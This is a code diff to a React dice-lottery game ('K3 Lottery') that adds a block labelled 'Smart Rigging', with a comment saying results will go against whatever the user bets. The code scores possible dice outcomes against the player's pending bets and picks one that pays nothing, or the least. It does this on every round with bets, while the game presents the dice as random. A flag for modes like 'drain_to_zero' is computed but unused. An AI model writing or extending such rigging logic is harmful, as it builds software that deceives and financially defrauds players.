@@ -50,7 +50,7 @@ const DICE_PNGS = {
 };
 
 export default function K3LotteryGame({ onClose, onOpenDeposit, onOpenWithdraw }) {
-  const { user, adjustUserBalance, getGameEffectiveSettings } = useGame();
+  const { user, adjustUserBalance, recordGameHistory, getGameEffectiveSettings } = useGame();
 
   // Mode Selection: '1m', '3m', '5m', '10m'
   const [selectedDuration, setSelectedDuration] = useState('1m');
@@ -126,24 +126,55 @@ export default function K3LotteryGame({ onClose, onOpenDeposit, onOpenWithdraw }
       let d2 = Math.floor(Math.random() * 6) + 1;
       let d3 = Math.floor(Math.random() * 6) + 1;
 
-      // Force Win / Loss RNG override
+      // Smart Rigging: "user jiduk dhorba onno dik result asba ar loss diba"
       const pendingBets = myBets.filter(b => b.period === periodId && b.status === 'pending');
-      if (eff.mode === 'force_win' && pendingBets.length > 0) {
-        const b = pendingBets[0];
-        if (b.type === 'size') {
-          if (b.value === 'Big') { d1 = 4; d2 = 5; d3 = 4; }
-          else { d1 = 2; d2 = 3; d3 = 3; }
-        } else if (b.type === 'sum') {
-          const targetSum = Number(b.value);
-          d1 = Math.min(6, Math.max(1, Math.floor(targetSum / 3)));
-          d2 = Math.min(6, Math.max(1, Math.floor((targetSum - d1) / 2)));
-          d3 = Math.min(6, Math.max(1, targetSum - d1 - d2));
-        }
-      } else if (eff.mode === 'force_loss' && pendingBets.length > 0) {
-        const b = pendingBets[0];
-        if (b.type === 'size') {
-          if (b.value === 'Big') { d1 = 1; d2 = 2; d3 = 3; }
-          else { d1 = 5; d2 = 5; d3 = 6; }
+      const isTargetedLoss = 
+        user?.force_result === 'force_lose' ||
+        user?.force_mode === 'force_loss' ||
+        user?.force_mode === 'drain_to_zero' ||
+        user?.luck_mode === 'drain' ||
+        Number(user?.custom_win_rate) === 0 ||
+        Number(user?.custom_rtp) === 0 ||
+        (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
+      if (pendingBets.length > 0) {
+        // Find dice sets that give 0 payout to user (exact opposite of user bets)
+        const candidateSets = [
+          [1, 2, 3], [1, 2, 4], [1, 3, 4], [2, 3, 4],
+          [3, 4, 5], [3, 4, 6], [4, 5, 6], [2, 5, 6]
+        ];
+
+        const scoredSets = candidateSets.map(set => {
+          const s = set[0] + set[1] + set[2];
+          const isTrip = set[0] === set[1] && set[1] === set[2];
+          const isPr = (set[0] === set[1] || set[1] === set[2] || set[0] === set[2]) && !isTrip;
+          const sz = s >= 11 ? 'Big' : 'Small';
+          const par = s % 2 === 0 ? 'Even' : 'Odd';
+
+          let payout = 0;
+          for (const b of pendingBets) {
+            let won = false;
+            if (b.type === 'sum' && Number(b.value) === s) won = true;
+            if (b.type === 'size' && b.value === sz && !isTrip) won = true;
+            if (b.type === 'parity' && b.value === par && !isTrip) won = true;
+            if (b.type === 'triple' && isTrip && (b.value === 'any' || b.value === set[0])) won = true;
+            if (b.type === 'pair' && isPr && (b.value === 'any' || set[0] === b.value || set[1] === b.value)) won = true;
+            if (won) payout += (b.amount * b.mult);
+          }
+          return { set, sum: s, payout };
+        });
+
+        const zeroSets = scoredSets.filter(x => x.payout === 0);
+        if (zeroSets.length > 0) {
+          const chosen = zeroSets[Math.floor(Math.random() * zeroSets.length)];
+          d1 = chosen.set[0];
+          d2 = chosen.set[1];
+          d3 = chosen.set[2];
+        } else {
+          scoredSets.sort((a, b) => a.payout - b.payout);
+          d1 = scoredSets[0].set[0];
+          d2 = scoredSets[0].set[1];
+          d3 = scoredSets[0].set[2];
         }
       }
 
@@ -190,6 +221,16 @@ export default function K3LotteryGame({ onClose, onOpenDeposit, onOpenWithdraw }
         }
         return b;
       }));
+
+      if (hadPendingBets && recordGameHistory) {
+        const totalRoundBet = myBets.filter(b => b.period === periodId).reduce((s, b) => s + (b.amount || 0), 0);
+        recordGameHistory({
+          game: 'K3 Lottery',
+          bet: totalRoundBet,
+          win: winPayout,
+          mult: winPayout > 0 ? (winPayout / Math.max(1, totalRoundBet)).toFixed(2) + 'x' : '0.00x'
+        });
+      }
 
       if (winPayout > 0) {
         adjustUserBalance(user.uid, winPayout);
